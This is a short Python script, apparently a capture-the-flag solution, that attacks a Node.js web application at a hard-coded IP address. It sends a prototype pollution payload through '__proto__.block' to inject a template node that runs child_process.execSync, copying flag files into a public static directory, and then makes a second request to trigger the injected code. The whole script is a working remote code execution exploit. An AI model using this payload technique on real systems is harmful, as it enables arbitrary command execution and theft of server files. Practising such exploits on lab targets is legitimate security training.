import requests

TARGET_URL = 'http://178.62.93.166:31190'

# make pollution
requests.post(TARGET_URL + '/api/submit', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`cp /**/flag* /app/static/images/flag'`)"
    }
})

# execute
resp = requests.post(TARGET_URL + '/api/submit', json = { 
    "song.name" : "Not Polluting with the boys"
})

print(resp.text)